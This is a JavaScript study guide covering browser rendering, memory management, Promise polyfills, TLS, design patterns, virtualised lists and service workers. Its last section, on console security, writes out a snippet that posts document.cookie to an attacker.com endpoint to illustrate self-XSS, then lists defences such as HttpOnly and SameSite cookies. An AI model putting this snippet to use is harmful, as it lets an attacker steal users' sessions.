# JavaScript Advanced Concepts

---

## 1. How Browsers Work

When you type a URL into the browser's address bar, a complex sequence of steps takes place before the page becomes interactive.

### Step 1: DNS Lookup

The browser doesn't know the IP address of the server behind a domain name (e.g., `google.com`). It queries the **Domain Name System (DNS)** — essentially the phonebook of the internet — to resolve the domain to an IP address. Once resolved, a **TCP connection** (and usually a **TLS handshake** for HTTPS) is established between the browser and the server.

### Step 2: Server Responds with HTML

Once the connection is established, the browser sends an **HTTP GET request**. The server responds with the **HTML file** — the skeleton of the web page — along with response headers.

### Step 3: Parsing — Building DOM and CSSOM

The browser starts **parsing the HTML** byte by byte, converting it into the **Document Object Model (DOM)** — a tree representation of the page structure. Simultaneously, any CSS (linked or embedded) is parsed into the **CSS Object Model (CSSOM)** — a similar tree for styling rules.

> When the parser encounters `<script>` tags without `defer` or `async`, parsing is **blocked** until the script is downloaded and executed.

### Step 4: JavaScript Compilation & Accessibility Tree

JavaScript is **compiled and executed** by the JS engine (e.g., V8). Also in this step, the **Accessibility Tree** is built — used by assistive technologies like screen readers to understand the page.

### Step 5: Rendering Pipeline

The rendering pipeline consists of four key steps:

| Step            | Description                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------- |
| **Style**       | DOM + CSSOM are merged into the **Render Tree**, which contains only visible nodes with computed styles    |
| **Layout**      | The browser calculates the exact **position and size** of every element on the page (also called "reflow") |
| **Paint**       | Individual pixels are drawn to the screen — this is the **first time something becomes visible**           |
| **Compositing** | Layers are combined in the correct order. Used for elements with `transform`, `opacity`, etc.              |

### Step 6: Interactivity (TTI)

Even after the page is visually painted, it may not be **interactive** yet. If there is deferred JavaScript still executing, the main thread is busy and cannot respond to user events.

**Time to Interactive (TTI)** measures the time from the initial request to when the page is fully interactive and reliably responds to user input.

---

## 2. Critical Rendering Path (CRP)

The **Critical Rendering Path** is the sequence of steps the browser takes to convert HTML, CSS, and JavaScript into pixels on the screen. Optimizing the CRP directly improves **initial load performance**.

```
HTML → DOM
CSS  → CSSOM
         ↓
      Render Tree
         ↓
       Layout
         ↓
       Paint
```

### Render Tree

- Combines the **DOM** and **CSSOM**
- Only includes **visible** nodes (e.g., elements with `display: none` are excluded)
- Every node in the render tree has its computed styles attached

### Layout (Reflow)

- Calculates the **geometry** (position, width, height) of each visible element
- More DOM nodes = slower layout
- Layout is **triggered again** any time:
  - Nodes are added/removed from the DOM
  - Content changes (e.g., text update)
  - Box model properties change (e.g., `width`, `padding`, `margin`)

> **Optimization tip:** Batch DOM updates and avoid animating box model properties to reduce layout thrashing.

### Paint (Repaint)

- Converts the render tree into actual **pixels** on the screen
- On initial load, the **entire screen** is painted
- Subsequent changes only repaint the **affected area**
- Paint performance depends on how many and what kind of updates occur

---

## 3. Memory Management in JavaScript

### Configuring Node.js Heap Memory

By default, Node.js limits heap memory. You can increase it using the `--max-old-space-size` flag:

```bash
node --max-old-space-size=6000 index.js
```

This sets the maximum old-generation heap size to 6 GB.

### Common Causes of Memory Leaks

| Cause                | Explanation                                                                                                   |
| -------------------- | ------------------------------------------------------------------------------------------------------------- |
| **Global variables** | Variables accidentally declared in global scope (missing `var`/`let`/`const`) are never garbage collected     |
| **Forgotten timers** | `setInterval()` or `setTimeout()` that are never cleared keep their callback and referenced objects in memory |
| **Closures**         | Closures that inadvertently hold references to large objects prevent them from being collected                |

### Browser Memory Lifecycle

Every variable/object in JS goes through three phases:

1. **Allocate** — Memory is allocated when a variable or object is created
2. **Use** — The memory is read from or written to during program execution
3. **Release** — Memory is freed when it's no longer needed

### Garbage Collection — Mark and Sweep

JavaScript uses the **Mark and Sweep** algorithm for garbage collection:

1. The GC starts from **roots** (global object, stack variables)
2. It **marks** all reachable objects
3. Everything **not marked** is considered unreachable and **swept** (freed)

### WeakSet and WeakMap

JavaScript exposes `WeakSet` and `WeakMap` as memory-friendly data structures:

- They hold **weak references** — the GC can collect an object even if it's still in a `WeakSet`/`WeakMap`
- Useful for caching or tracking objects **without preventing garbage collection**

```js
const cache = new WeakMap();
const obj = {};
cache.set(obj, "some data");
// When obj is no longer referenced elsewhere, it can be GC'd
```

---

## 4. Promise Polyfills

Understanding how to implement Promise APIs from scratch is a core JavaScript interview topic.

### 4.1 Custom `Promise`

A Promise has three internal states: **PENDING**, **FULFILLED**, and **REJECTED**.

```js
const PENDING = 0;
const FULFILLED = 1;
const REJECTED = 2;

function customPromise(executor) {
  let state = PENDING;
  let value;
  let thenHandlers = [];
  let catchHandlers = [];

  function resolve(val) {
    if (state !== PENDING) return;
    state = FULFILLED;
    value = val;
    thenHandlers.forEach((fn) => fn(value));
  }

  function reject(err) {
    if (state !== PENDING) return;
    state = REJECTED;
    value = err;
    catchHandlers.forEach((fn) => fn(value));
  }

  this.then = function (callback) {
    if (state === FULFILLED) return callback(value);
    else thenHandlers.push(callback);
    return this;
  };

  this.catch = function (callback) {
    if (state === REJECTED) return callback(value);
    else catchHandlers.push(callback);
    return this;
  };

  executor(resolve, reject);
}
```

**Key concepts:**

- The executor is called **immediately** on instantiation
- `.then()` and `.catch()` register callbacks if the promise hasn't settled yet
- `resolve`/`reject` are **idempotent** — once called, further calls are ignored

---

### 4.2 `Promise.all()` Polyfill

`Promise.all()` resolves when **all** promises resolve, or **rejects immediately** if any one rejects.

```js
const promiseAllPolyfill = (taskArray) => {
  return new Promise((resolve, reject) => {
    const ans = [];
    let resolvedCount = 0;

    taskArray.forEach((promise, index) => {
      Promise.resolve(promise)
        .then((data) => {
          ans[index] = data;
          resolvedCount++;
          if (resolvedCount === taskArray.length) {
            resolve(ans);
          }
        })
        .catch((error) => reject(error));
    });
  });
};
```

> **Note:** The original implementation used `index === taskArray.length - 1` as the completion check, which is a bug — it fails if the last promise resolves first. Using a `resolvedCount` counter is the correct approach.

---

### 4.3 `Promise.any()` Polyfill

`Promise.any()` resolves as soon as **any one** promise resolves. Rejects with an **AggregateError** (array of errors) only if **all** promises reject.

```js
function customPromiseAny(arr) {
  let errCounter = 0;
  const errMap = [];

  return new Promise((resolve, reject) => {
    arr.forEach((promise, i) => {
      Promise.resolve(promise)
        .then(resolve)
        .catch((err) => {
          errMap[i] = err;
          errCounter++;
          if (errCounter === arr.length) {
            reject(errMap); // All failed
          }
        });
    });
  });
}
```

---

### 4.4 `Promise.race()` Polyfill

`Promise.race()` settles (resolves **or** rejects) as soon as the **first** promise settles — whichever comes first.

```js
function customPromiseRace(arr) {
  return new Promise((resolve, reject) => {
    arr.forEach((promise) => {
      Promise.resolve(promise).then(resolve).catch(reject);
    });
  });
}
```

### Summary Table

| API                  | Resolves when                         | Rejects when                          |
| -------------------- | ------------------------------------- | ------------------------------------- |
| `Promise.all`        | **All** resolve                       | **Any one** rejects                   |
| `Promise.any`        | **Any one** resolves                  | **All** reject                        |
| `Promise.race`       | **First** settles (resolve or reject) | **First** settles (resolve or reject) |
| `Promise.allSettled` | **All** settle (resolve or reject)    | Never rejects                         |

---

## 5. JSON (JavaScript Object Notation)

**JSON** is a lightweight, text-based data interchange format. It is derived from JavaScript object syntax but is **language-independent**.

```json
{
  "name": "Alice",
  "age": 30,
  "isAdmin": false,
  "scores": [100, 95, 88],
  "address": null
}
```

### Key Methods

```js
// Convert JSON string → JS object
const obj = JSON.parse('{"name":"Alice"}');

// Convert JS object → JSON string (for sending to server)
const jsonStr = JSON.stringify({ name: "Alice" });
```

### JSON Data Types

| Allowed | Not Allowed |
| ------- | ----------- |
| String  | Function    |
| Number  | Date object |
| Object  | `undefined` |
| Array   |             |
| Boolean |             |
| `null`  |             |

> **Important:** In JSON, all **keys must be strings wrapped in double quotes** — unlike JS object literals where keys can be unquoted.

---

## 6. Pipe and Compose

### Pipe

**Pipe** chains multiple functions **left-to-right**, passing the output of one as the input to the next.

```js
const pipe =
  (...fns) =>
  (value) =>
    fns.reduce((acc, fn) => fn(acc), value);

const add10 = (x) => x + 10;
const double = (x) => x * 2;
const subtract5 = (x) => x - 5;

const transform = pipe(add10, double, subtract5);
console.log(transform(5)); // ((5 + 10) * 2) - 5 = 25
```

### Compose

**Compose** is the same concept but **right-to-left** (mathematical function composition: `f(g(x))`).

```js
const compose =
  (...fns) =>
  (value) =>
    fns.reduceRight((acc, fn) => fn(acc), value);

const transform = compose(subtract5, double, add10);
console.log(transform(5)); // Same result: 25
```

> JavaScript does not have built-in `pipe` or `compose` functions, but they are commonly implemented in functional utility libraries like **Ramda** or **lodash/fp**.

---

## 7. SSL / TLS

### What is SSL/TLS?

**SSL (Secure Sockets Layer)** — now superseded by **TLS (Transport Layer Security)** — is a cryptographic protocol that provides:

- **Encryption** of data in transit
- **Authentication** of the server's identity
- **Data integrity** (tamper detection)

Any website using `HTTPS` is using TLS under the hood.

### How SSL/TLS Works

1. **Handshake** — The browser and server negotiate which cipher suite to use and authenticate the server via its SSL certificate
2. **Key Exchange** — A symmetric session key is established using **asymmetric encryption** (public/private key pair)
3. **Encrypted Communication** — All further data is encrypted using the session key

### SSL Certificates

An SSL certificate is issued by a **Certificate Authority (CA)** and contains:

- The website's **public key**
- The domain name it's valid for
- Expiry date
- CA's digital signature

The server holds the matching **private key** — used to decrypt data encrypted with the public key.

### Types of SSL Certificates

| Type                   | Description                                                         |
| ---------------------- | ------------------------------------------------------------------- |
| **Single-domain**      | Secures one specific domain                                         |
| **Wildcard**           | Secures a domain and all its **subdomains** (e.g., `*.example.com`) |
| **Multi-domain (SAN)** | Secures multiple different domains in one certificate               |

### Validation Levels

| Level                            | Description                                            |
| -------------------------------- | ------------------------------------------------------ |
| **Domain Validation (DV)**       | Basic — only proves domain ownership                   |
| **Organization Validation (OV)** | Verifies the organization behind the domain            |
| **Extended Validation (EV)**     | Highest trust level; shows company name in browser bar |

---

## 8. Design Patterns

Design patterns are **reusable solutions** to commonly occurring problems in software design. They are not code — they are **concepts and templates**.

> Reference: [https://www.patterns.dev/](https://www.patterns.dev/)

### Singleton Pattern

A **Singleton** ensures that a class has **only one instance** throughout the application's lifecycle, and provides a **global access point** to that instance.

```js
class Singleton {
  constructor() {
    if (Singleton.instance) {
      return Singleton.instance;
    }
    this.state = {};
    Singleton.instance = this;
  }

  getState(key) {
    return this.state[key];
  }

  setState(key, value) {
    this.state[key] = value;
  }
}

const s1 = new Singleton();
const s2 = new Singleton();

console.log(s1 === s2); // true — same instance
```

**Use cases:**

- Global state management (similar to a Redux store)
- Logger instances
- Database connection pools
- Configuration managers

**Other React-relevant patterns:** Provider, Proxy, Observer, Factory, HOC (Higher-Order Components).

---

## 9. Virtualisation in Web Applications

When rendering **large lists** (e.g., 500+ rows), rendering all DOM nodes at once is expensive and causes performance issues.

### The Problem

- 500 items × 30px height = **15,000px** of DOM content
- All 500 `<div>` elements exist in memory and on the page
- This leads to slow initial render, heavy memory usage, and laggy scrolling

### The Solution: Windowing / Virtualisation

Only render the **visible rows** at any given time (e.g., ~40 rows visible in the viewport). As the user scrolls:

- New rows entering the viewport are **added to the DOM**
- Rows scrolling out of view are **removed from the DOM**

The **total scroll height is maintained** using a placeholder, so scroll position feels natural.

### Libraries

- [`react-window`](https://github.com/bvaughn/react-window) — lightweight, recommended
- [`react-virtualized`](https://github.com/bvaughn/react-virtualized) — feature-rich, heavier

### How It Works Internally

These libraries use the **Intersection Observer API** to detect when elements enter or leave the viewport, then add/remove nodes from the DOM accordingly.

```js
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      // Element entered viewport — render it
    } else {
      // Element left viewport — remove it
    }
  });
});
```

---

## 10. Service Workers

### What is a Service Worker?

A **Service Worker** is a script that runs in the browser **in the background**, separate from the main web page thread. It acts as a **programmable proxy** between the browser and the network.

**Capabilities:**

- Enable **offline experiences** by caching assets and API responses
- **Intercept and modify** network requests
- Power **Push Notifications**
- Enable **Background Sync** (retry failed requests when connectivity resumes)

### Key Characteristics

| Property         | Detail                                                     |
| ---------------- | ---------------------------------------------------------- |
| **Thread**       | Runs on a **Worker thread** — separate from main JS thread |
| **DOM access**   | ❌ No direct DOM access                                    |
| **Blocking**     | Non-blocking — fully asynchronous                          |
| **Protocol**     | Only works over **HTTPS** (except `localhost`)             |
| **Storage APIs** | Cannot use synchronous APIs like `localStorage`            |

### Why HTTPS Only?

Service workers can intercept **all network requests**. If allowed over HTTP, a man-in-the-middle attacker could inject a malicious service worker and intercept everything. HTTPS ensures the service worker code itself is trusted.

### Service Worker Lifecycle

```
Registration (navigator.serviceWorker.register())
        ↓
   Download
        ↓
   Install  ← cache assets here (install event)
        ↓
   Activate ← clean up old caches here (activate event)
        ↓
   Idle / Fetch / Message events
```

```js
// Registering a service worker
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js").then((reg) => {
    console.log("Service Worker registered", reg);
  });
}

// Inside sw.js — caching on install
self.addEventListener("install", (event) => {
  event.waitUntil(
    caches
      .open("v1")
      .then((cache) => cache.addAll(["/index.html", "/style.css"])),
  );
});

// Intercept fetch requests
self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches
      .match(event.request)
      .then((response) => response || fetch(event.request)),
  );
});
```

---

## 11. Console Security — Can You Get Hacked via Console?

### The Short Answer: Yes

When you log into a website, the browser stores your session as **cookies**. These cookies act as your identity — whoever holds your cookies can impersonate you.

```js
// Try this in your browser console on any logged-in site:
document.cookie; // Returns all cookies for this domain
```

### The Attack Vector: Social Engineering via Console

A malicious script can exfiltrate your cookies to an attacker's server:

```js
(() => {
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: document.cookie,
  });
})();
```

If you paste this into your browser console on a logged-in site:

1. Your cookies are **sent to the attacker's server**
2. The attacker can **replay those cookies** in their browser
3. They are now **logged in as you** — no password needed

### Why Websites Warn Against Pasting Code

Major sites (Facebook, Instagram, etc.) display a **"Self-XSS"** warning in the console specifically to prevent this attack. This is called **Social Engineering** — tricking a user into attacking themselves.

### How to Protect Against This

- **Never paste unknown code** into your browser console
- Websites can use `HttpOnly` cookies — these are **not accessible via `document.cookie`** (but the session can still be hijacked via other means)
- `SameSite=Strict` cookie attribute prevents cross-site request forgery

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## Summary

| Topic                   | Key Takeaway                                                        |
| ----------------------- | ------------------------------------------------------------------- |
| Browser rendering       | DNS → HTML → DOM/CSSOM → Render Tree → Layout → Paint → Interactive |
| Critical Rendering Path | Optimize by reducing render-blocking resources and DOM size         |
| Memory management       | Avoid globals, clear timers, use WeakMap/WeakSet for caches         |
| Promise polyfills       | Understand state machines and callback queues                       |
| JSON                    | Text-only format; use `parse`/`stringify` for serialization         |
| Pipe / Compose          | Functional programming patterns for function composition            |
| SSL/TLS                 | Encrypts traffic; certificates verify server identity               |
| Design Patterns         | Singleton: one instance, global access                              |
| Virtualisation          | Render only visible rows; use `react-window`                        |
| Service Workers         | Background proxy; enables offline, push, sync                       |
| Console security        | Never paste unknown code; cookies can be stolen                     |
